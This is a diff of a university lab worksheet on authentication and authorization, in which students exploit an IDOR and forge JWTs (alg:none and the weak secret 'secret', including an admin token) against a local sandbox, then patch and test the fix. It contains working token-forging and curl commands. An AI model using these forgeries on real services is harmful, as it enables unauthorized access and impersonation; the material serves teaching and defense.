@@ -6,6 +6,14 @@
 
 > ⚠️ **Ethics note:** Forging tokens and accessing other users' objects is only legal in this sandbox (`vulnerable_app.py`) and your own Juice Shop. Doing it to a real service is unauthorized access. Keep all activity inside `http://localhost:8080`.
 
+## Class and assessment contract
+
+**Contact time: 150 minutes** = quiz/review 10 + explanation/demo 15 + supervised practical 100 + debrief/reasoning 20 + evidence/exit 5. Pre-pull images and prepare tools before class. The full concepts, longer questions and extension tasks stay available for preparation/follow-up; the instructor uses the bounded core below in class.
+
+**Both assigned versions include the same common practical 60 points.** Complete that core plus **one** assigned 40-point section: **Conventional** = Part 2 written questions 20 + Part 4 reflection 20; **AIR-Sec** = Audit-the-AI 20 + Explain-in-Plain-English 10 + Prompt Problem 10. Each version totals 100. The unassigned section is reference practice, not another required 40 points. Only the named 100-minute core is assessed in the shared 60; other practical tasks are optional extension/reference unless explicitly used in the assigned written questions, and are not a prerequisite for full marks. Each of the twelve individual teaching worksheets contributes `score / 100 × 2.5` course points.
+
+Viva/reproduction checks verify the work within its existing rubric, with no separate score or automatic-zero rule. Complete the common practical evidence in either version, disclose any AI assistance, and use the normal name/Student ID and task-specific evidence requirements. Do not substitute a shared practice flag for proof from an actually assigned hosted instance.
+
 ## Part 1 — Student Information
 
 | Name | Student ID | Date | Group |
@@ -18,43 +26,38 @@
 
 Answer in 2–4 sentences each.
 
-1. Distinguish **authentication** from **authorization**. In `vulnerable_app.py`, `get_order` calls `current_user()` but ignores its result (L63) — which of the two is missing?
-2. What is **IDOR** (CWE-639)? Why is `/api/orders/<oid>` exploitable, and what single check in `solution_app.py` (L64) closes it?
-3. Explain the **`alg:none`** JWT attack. Line 55 passes **both** `algorithms=["none"]` *and* `options={"verify_signature": False}` — which of the two actually disables signature checking, and why does PyJWT need both together for an `alg=none` token? (Try `jwt.decode(tok, algorithms=["none"])` *without* the `options=` — PyJWT still raises `InvalidSignatureError`.)
+1. Distinguish **authentication** from **authorization**. In `vulnerable_app.py`, `get_order` calls `current_user()` but ignores its result — which of the two is missing?
+2. What is **IDOR** (CWE-639)? Why is `/api/orders/<oid>` exploitable, and what ownership check in `solution_app.py` closes it?
+3. Explain the **`alg:none`** JWT attack. In `current_user()`, the vulnerable branch passes **both** `algorithms=["none"]` *and* `options={"verify_signature": False}` — which of the two actually disables signature checking? (With the pinned PyJWT version, `jwt.decode(tok, algorithms=["none"])` without the `options=` still raises `InvalidSignatureError`.)
 4. Why is the hardcoded HMAC secret `"secret"` (CWE-321) dangerous even if `alg:none` were disabled? How does a strong random secret + pinned algorithm defend the token?
 5. What do the JWT claims **`exp`** and **`aud`** add, and why does the secure version reject tokens that lack them?
 
-## Part 3 — Hands-on Lab (125 min in class + 25 min homework)
+## Part 3 — Shared practical core (100 min in class)
 
-> **In class or homework.** Tasks marked *in class* are done during the lab, where the instructor
-> checks your evidence and reasoning. Tasks marked *homework* are finished after class and submitted
-> with the rest of this worksheet, before the next class. Every task keeps its time and its marks.
-> Answer Part 2 before class, from this week's slides; Part 4, *Audit the AI* and *Comprehension &
-> Prompt* are homework.
->
-> **In class (125 min):** Tasks 0, 1, 2, 3 and 5 · **Homework (25 min):** Task 4
->
-> Task 5's re-test of the forged admin token on `/api/admin` goes with Task 4.
+**100-minute core:** Legitimate session (5), cross-user IDOR (20), unsigned JWT (15), weak-key JWT (15), student verification/ownership patch and controls (45).
 
-**Learning goals:** exploit IDOR, forge JWTs two ways (`alg:none` and weak secret), then prove `solution_app.py` enforces ownership and rejects forged tokens. Steps mirror `attack.md`.
+The minute labels are activity budgets. Task 4 is optional follow-up practice and adds no graded points. Complete Part 2/Part 4 only for the assigned Conventional 40, or Audit/EiPE/Prompt only for the assigned AIR-Sec 40.
 
-**Prerequisites:** Docker + Docker Compose, `curl`, Python 3 **on your host** with `pyjwt` installed (Tasks 2–4 forge tokens locally via `python3 -`, not inside the container), optionally Burp Suite. Working dir: `labs/week06-authn-authz/`.
 
-**Before class — install `pyjwt` on your host and verify it:**
+**Learning goals:** observe IDOR and two JWT forgeries (`alg:none` and weak secret), then implement ownership and token verification in `student_patch.py` and prove the controls with `student_checks.py`. `solution_app.py` is a comparison reference.
+
+
+**Prerequisites:** Docker + Docker Compose and `curl` on the host; optionally Burp Suite. Working dir: `labs/week06-authn-authz/`. The prebuilt image supplies Python, Flask and PyJWT for the target, token minting and student checks. No host Python or PyJWT install is required.
+
+**Before class — build once while online, then self-check offline:**
 ```bash
-python3 -m venv .venv && source .venv/bin/activate   # Windows: .venv\Scripts\activate
-pip install pyjwt
-python3 -c "import jwt; print('pyjwt OK')"           # must print "pyjwt OK", not an ImportError
+cd labs/week06-authn-authz
+docker compose build
+docker run --rm --network none kosen-swsec-week06:local python -c 'import flask,jwt; print("Week 6 image ready")'
 ```
-(`docker compose up`'s `pyjwt` is a *separate* install, inside the container, only for running `vulnerable_app.py`/`solution_app.py` — it does not reach Tasks 2–4's host-side `python3 -` snippets.)
 
 ### Environment setup
 
 ```bash
-cd labs/week06-authn-authz
-docker compose up            # python:3.12-slim + flask + pyjwt, runs vulnerable_app.py
+docker compose up --no-build --pull never   # runs vulnerable_app.py from the prebuilt image
 # vulnerable app -> http://localhost:8080   (service name: authz-lab, port 8080)
 ```
+Run this in the same lab folder used for the build. Open a second terminal there for the commands below.
 Optional secondary target / proxy:
 ```bash
 docker run --rm -p 127.0.0.1:3000:3000 bkimminich/juice-shop  # -> http://localhost:3000
@@ -74,12 +77,13 @@ docker run --rm -p 127.0.0.1:3000:3000 bkimminich/juice-shop  # -> http://localh
 ```bash
 TOKEN=$(curl -s -X POST http://localhost:8080/login \
   -H 'Content-Type: application/json' \
-  -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
+  -d '{"user":"alice","pw":"alicepw"}' | docker run --rm -i --network none kosen-swsec-week06:local \
+    python -c 'import sys,json;print(json.load(sys.stdin)["token"])')
 echo "$TOKEN"
 ```
 Confirm `/api/orders/1` returns alice's Laptop order. *Deliverable: screenshot of the token + order 1.*
 
-**Task 1 — IDOR Treasure Hunt (30 min, in class) 🗺️.**
+**Task 1 — IDOR Treasure Hunt (20 min, in class) 🗺️.**
 - *Goal:* read **bob's** order with **alice's** token.
 - *Steps:*
   ```bash
@@ -92,77 +96,85 @@ Confirm `/api/orders/1` returns alice's Laptop order. *Deliverable: screenshot o
 jwt-forge
 ```
 
-**Task 2 — JWT Forgery via alg:none (30 min, in class) 🔏.**
+**Task 2 — JWT Forgery via alg:none (15 min, in class) 🔏.**
 - *Goal:* impersonate bob with an **unsigned** token (no secret needed).
 - *Steps:*
   ```bash
-  FORGED=$(python3 - <<'PY'
-  import jwt
-  print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))
-  PY
-  )
+  FORGED=$(docker run --rm --network none kosen-swsec-week06:local \
+    python -c 'import jwt; print(jwt.encode({"sub":"bob"}, key="", algorithm="none"))')
   curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
   ```
 - *Deliverable:* the forged token + screenshot of the accepted response + explanation of the `none` flaw (CWE-347).
 
-**Task 3 — JWT Forgery via weak secret (30 min, in class) 🔏.**
+**Task 3 — JWT Forgery via weak secret (15 min, in class) 🔏.**
 - *Goal:* sign a *valid* HS256 token because the secret is the guessable string `secret` (CWE-321).
 - *Steps:*
   ```bash
-  FORGED2=$(python3 - <<'PY'
-  import jwt
-  print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))
-  PY
-  )
+  FORGED2=$(docker run --rm --network none kosen-swsec-week06:local \
+    python -c 'import jwt; print(jwt.encode({"sub":"bob"}, "secret", algorithm="HS256"))')
   curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
   ```
 - *Note:* recent PyJWT prints an `InsecureKeyLengthWarning` to **stderr** because `"secret"` is only 6 bytes — that is expected, the token still mints and is accepted.
 - *Deliverable:* token + screenshot + 2–3 sentences on why secret strength + key management matter.
 
-**Task 4 — Privilege escalation to admin via a forged token (25 min, homework) 🔏.**
+**Task 4 — Optional extension: admin forgery (home practice, no extra points) 🔏.**
 - *Goal:* read the admin-only flag at `/api/admin` — a page **IDOR cannot reach**: there is no object id to walk, and there is no `admin` account you could log in as (`USERS` has only alice and bob). The only way in is to forge your identity.
 - *Steps:* forge a token claiming `sub=admin` (either technique from Task 2/3 works — `alg:none` or the weak `"secret"`), then call `/api/admin`:
   ```bash
-  FORGED=$(python3 - <<'PY'
-  import jwt
-  print(jwt.encode({"sub": "admin"}, key="", algorithm="none"))
-  PY
-  )
+  FORGED=$(docker run --rm --network none kosen-swsec-week06:local \
+    python -c 'import jwt; print(jwt.encode({"sub":"admin"}, key="", algorithm="none"))')
   curl -s http://localhost:8080/api/admin -H "Authorization: Bearer $FORGED"
   ```
   You should get `FLAG{...}`. Then confirm alice's **real** token gets `403 forbidden` on the same endpoint — proof the server's role check (`if user != "admin"`) is fine; the break is purely that authentication accepted a forged identity.
 - *Deliverable:* the forged token + screenshot of the flag + the `403` for alice's real token, and 2–3 sentences: why IDOR can't reach this (horizontal access vs. **vertical** privilege escalation), and why the app's own `if user != "admin"` check didn't save it.
 
-**Task 5 — Defend / fix it (30 min, in class) 🛡️.**
-- *Goal:* prove `solution_app.py` blocks Tasks 1–4.
-- *Steps:* stop the vulnerable container (`Ctrl-C`), then:
-  ```bash
-  docker compose run --rm --service-ports authz-lab bash -c "pip install --no-cache-dir flask pyjwt && python solution_app.py"
-  ```
-  Re-run: get a fresh alice token, then re-fire each attack. Expected: `/api/orders/2` with alice's token → **403 forbidden** (ownership check, L64); the `alg:none` token → **401 invalid token** (algorithm pinned to HS256, L50); the `"secret"` token → **401** (strong random secret + required `aud`/`exp`, L10/40). For Task 4, `/api/admin` with a forged `sub=admin` token → **401** — the *same* `current_user()` fix (L50) rejects the forgery before the role check runs, so one fix closes every endpoint; alice's real token still gets **403** there (she isn't admin).
-- *Deliverable:* screenshots of the 403 and the 401s (orders **and** `/api/admin`) + name the fix line for each.
+**Task 5 — Defend / fix it (45 min, in class) 🛡️.**
+- *Goal:* implement token verification and order ownership in `student_patch.py`, then prove both legitimate and attack cases with `student_checks.py`.
+- *Steps:* follow the required student-patch instructions below. Run the `student_checks.py` Docker command before and after your edit; the untouched TODOs must fail, and the completed patch must pass the positive and negative controls. The prewritten `solution_app.py` is available for comparison after your own tests.
+- *Deliverable:* your `student_patch.py` commit, the failing-before and passing-after test results, and a short explanation of how JWT verification and object ownership stop the two failure paths. Running or citing `solution_app.py` alone is insufficient.
+
+
+### Student patch — required common practical evidence
+
+Complete `student_patch.py`: verify a JWT with the supplied secret and audience, allow only HS256, require `sub`, `aud` and `exp`, and enforce ownership on the requested order. The provided harness already supplies legitimate short-lived tokens; obtain them through `/login` rather than borrowing a token from a different app/run.
+
+```bash
+docker run --rm --network none -v "$PWD":/lab -w /lab kosen-swsec-week06:local python student_checks.py
+```
+
+The untouched TODOs fail. Your implementation must allow Alice's own order and Bob's own order, reject Alice reading Bob's order (403), reject absent/unsigned/wrong-key/expired/wrong-audience/missing-claim tokens (401), and keep a legitimate non-admin refused at `/api/admin` (403). Tests use Flask's in-process client and open no listener. Stop the other target before the optional browser run:
+
+```bash
+docker compose run --rm --no-deps --service-ports authz-lab python student_app.py
+```
+
+Submit your patch commit, positive and negative tests, and why authentication and object authorization are distinct decisions. The supplied `solution_app.py` stays as the complete reference; running that file alone does not demonstrate your implementation.
 
 ## Part 4 — Reflection
 
 1. **CWE/OWASP mapping:** map IDOR → **CWE-639 / A01**, the JWT forgeries → **CWE-347 & CWE-321 / A07**.
-2. **Real breach:** the **2022 Optus breach** exposed millions of customer records via an exposed/poorly-authorized API endpoint where identifiers could be enumerated — a textbook broken-access-control / IDOR-style failure. In 3–4 sentences connect it to Tasks 1 and 4 of this lab. *(Alternative: the Peloton API IDOR disclosure.)*
+2. **Real breach and evidence:** read the [Australian privacy regulator's account of the 2022 Optus breach](https://www.oaic.gov.au/news/media-centre/australian-information-commissioner-takes-civil-penalty-action-against-optus). It confirms unauthorized access to millions of customer records, but does not establish the exact IDOR mechanism used in our sandbox. In 3–4 sentences distinguish the confirmed facts from a possible access-control failure, then compare the *impact* with Task 1. Do not claim the real incident used our specific endpoint or token flaw without a source.
 3. **Best mitigation:** between deny-by-default ownership checks, pinning the JWT algorithm, and a strong managed secret, which control protects the most attack surface here, and why is server-side authorization non-negotiable?
 
 ## Grading rubric (100)
 
-| Criterion | Points |
-|-----------|-------:|
-| Part 2 — Lecture questions (conceptual accuracy) | 20 |
-| Part 3 — Exploitation + evidence (payloads/tokens + screenshots, Tasks 1–4) | 40 |
-| Part 3 — Defense (Task 5: fixes proven, lines cited) | 25 |
-| Part 4 — Reflection (CWE/OWASP mapping, breach, mitigation) | 15 |
-| **Total** | **100** |
+| Criterion | Conventional | AIR-Sec |
+|---|---:|---:|
+| Common practical: main task and observations | 20 | 20 |
+| Common practical: student defense/control or design, tests and limitations | 20 | 20 |
+| Common practical: reproducible evidence and reasoning | 20 | 20 |
+| Assigned Conventional Part 2 written questions | 20 | — |
+| Assigned Conventional Part 4 reflection | 20 | — |
+| Assigned Audit-the-AI | — | 20 |
+| Assigned Explain-in-Plain-English | — | 10 |
+| Assigned Prompt Problem | — | 10 |
+| **Total** | **100** | **100** |
 
 **Due:** 23:59 (Thai time) the night before next week's class (exact time on learn.zcr.ai/submit). **Late:** −10% per started day; 0 after 10 days.
 
 ---
 
-## Evidence & Integrity (required)
+## Evidence & Integrity — common to both versions
 
 - **Identity proof:** every screenshot/diagram must show a terminal running `printf '%s | %s | ' "$(whoami)" '<YOUR-STUDENT-ID>'; date '+%F %T %Z'` **in the
   same image as the evidence**. When the evidence is a browser page, a DevTools panel or a
@@ -172,25 +184,25 @@ jwt-forge
   the shot yours. Generic or borrowed evidence is not accepted.
 - **Personalized flag (if this lab issues one):** ____________________
   *Flags are unique per student — submitting another student's flag is a violation. How to submit: **learn.zcr.ai/submit** (full guide: [SUBMISSION.md](../../SUBMISSION.md)).*
-- **Explain in your own words** *(graded on your reasoning, not copied text):*
+- **Common practical reasoning** *(graded within the common 60, not as another EiPE score):*
   1. What did you do, and **why did the vulnerability work**?
   2. **Why does your fix actually stop it** — and what could still break it?
 
 ---
 
-## 🤖 Audit the AI (required)
+## 🤖 Audit the AI — assigned AIR-Sec section (20)
 
 AI is a power tool you must **distrust** — you are graded on your *critique*, not the AI's answer.
 
-1. Ask an AI assistant to exploit **or** fix this week's vulnerability. Paste its full answer.
-2. **Find what's wrong or risky** in it — insecure code, a subtly incomplete fix, a hallucinated API/function/CVE, a missed edge case, or wrong reasoning. Quote the exact line(s).
-3. Produce the **correct, verified** version yourself and explain in 2–3 sentences why the AI's output was insufficient.
+1. Audit a complete AI answer about this week's design, exploit or fix. Use the instructor-provided exhibit if one is assigned, or obtain an answer and paste it in full. A correct answer is allowed: verify its claims and state the remaining assumptions rather than inventing an error.
+2. **Check what is correct, wrong, risky or conditional** — insecure code, an incomplete fix, a hallucinated API/function/CVE, an edge case or unsupported reasoning. Quote the exact line(s) and support the evaluation with evidence.
+3. Supply a verified correction where needed; if the answer is correct, supply the verification and limits. Explain your conclusion in 2–3 sentences. Do not manufacture a defect to satisfy the task.
 
-> Disclose your AI use in the Part 1 table. This task counts toward your **Defense + Reflection** score.
+> Disclose your AI use in the Part 1 table. This is the assigned AIR-Sec Audit component (20 points); it is not added to the common 60 or to the Conventional 40.
 
 ---
 
-## 🧠 Comprehension & Prompt (required)
+## 🧠 Comprehension & Prompt — assigned AIR-Sec section (10 + 10)
 
 **A. Explain in Plain English (EiPE).** In 2–3 sentences, in your own words, describe what this week's vulnerable code/endpoint actually *does* and *why it is exploitable* — explain the mechanism, don't dump jargon.
 
